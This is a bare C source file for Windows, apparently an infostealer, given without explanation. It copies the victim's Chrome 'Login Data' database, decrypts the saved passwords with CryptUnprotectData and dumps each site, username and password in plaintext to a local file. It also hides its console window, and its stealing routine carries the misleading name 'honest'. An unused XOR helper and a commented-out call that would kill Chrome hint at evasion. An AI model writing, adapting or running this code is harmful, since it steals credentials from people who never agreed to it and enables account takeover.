
#pragma comment(lib, "Crypt32")
#pragma comment (lib, "sqlite3.lib")
#pragma comment(lib, "User32.lib")
#include <stdio.h>
#include <conio.h>
#include <Shlobj.h>
#include <process.h>
#include <string.h>
#include <conio.h>
#include "sqlite3.h"
#include <stdlib.h>
#include <Windows.h>
#include <wincrypt.h>
#include <Tlhelp32.h>
#include <winbase.h>
char buffer[60000];
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <io.h>
#include <winuser.h>
#define CP_PATH "./here.db"
#define MEM 214747477

int   copyFile(char *source, char *dest)
{
    int fd_source;
    int fd_dest;

    char buf[255];
    fd_source = open(source, _O_RDONLY);
    fd_dest = open(dest, _O_CREAT | _O_RDWR);
    if (fd_source <= 0)
        perror("FAILED open 1:");
    if (fd_dest <= 0)
    {
        if((fd_dest = open(dest, _O_RDWR) <= 0))
           perror("failed open 3");
    }
    else
    {
        while (read(fd_source, buf, 254) > 0)
        {
            write(fd_dest, buf, 254);
            memset(buffer, 0, 254);

        }
        close(fd_source);
        close(fd_dest);
    }
    return (1);
}

void killProcessByName(const char *filename)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof (pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                                          (DWORD) pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

char* concat(const char *s1, const char *s2)
{
    char * result;
    if (!(result = (char *)malloc(strlen(s1) + strlen(s2) + 1)))
        return (NULL);
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

void charxor (unsigned char **text, int len) 
{
    const unsigned char enc[8] = {173,135,131,121,110,119,187,143};
    int i;
    for (i = 0; i < len; i++) {
        (*text)[i] ^= enc[i % 8];
    }
}

int honest()
{
    sqlite3_initialize();
    sqlite3 *sqlHandle, *sqlHandle2;
    sqlite3_backup *backup;
    int call, call_backup;
    char *tail = NULL;
    sqlite3_stmt *stmt = NULL;
    char *env = getenv("USERNAME");
    char *path, *tmp;
    const unsigned char *s;
    int i=0;
    HANDLE p;
    char *cmd;

i = 0;
    //killProcessByName("chrome.exe");
    path = concat("\"C:\\Users\\", env);
    tmp = path;
    path = concat(path, "\\AppData\\Local\\Google\\Chrome/User Data\\Default\\Login Data\"");
    free(tmp);
    tmp = NULL;
    cmd = concat("copy ", path);
    tmp = cmd;
    cmd = concat(cmd, " here.db");
    //if (!(call = copyFile(path, CP_PATH)))
    //    perror("Error copyfile : ");
    system(cmd);
    call = sqlite3_open(CP_PATH, &sqlHandle);
    if (call != SQLITE_OK)
    {
        sqlite3_close(sqlHandle);
        exit(EXIT_SUCCESS);
    }
    //preparing statement to be executed
    if (sqlite3_prepare(sqlHandle, "SELECT username_value,origin_url,password_value FROM logins ", sizeof(char)*60, &stmt, NULL) != SQLITE_OK)
        printf("Can't retrieve data: %s\n", sqlite3_errmsg(sqlHandle));
    DATA_BLOB UnprotectedBlob;
    DATA_BLOB kek;
    int fd = open("./result.txt", _O_CREAT | _O_APPEND | _O_RDWR);
    while (sqlite3_step(stmt) == SQLITE_ROW)
    {
        kek.pbData = (BYTE *)sqlite3_column_text(stmt, 2);
        kek.cbData = (DWORD)sqlite3_column_bytes(stmt, 2);
        CryptUnprotectData(&kek, NULL, NULL, NULL, NULL, 0, &UnprotectedBlob);
        write(fd, sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
        write(fd, " | ", 3);
        write(fd, sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
        write(fd, ":", 1);
        for (i=0; i< (UnprotectedBlob.cbData) ;i++)
            write(fd, &UnprotectedBlob.pbData[i], 1);
            write(fd, "\n", 1);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(sqlHandle);
    sqlite3_close(sqlHandle2);
    sqlite3_shutdown();
    remove("./here.db");
    return 1;
}

int  main(int argc, char **argv)
{
    
    HWND hwnd;
    char *buf;
    int i = 0;
	hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
    honest();
    return (1);
    
}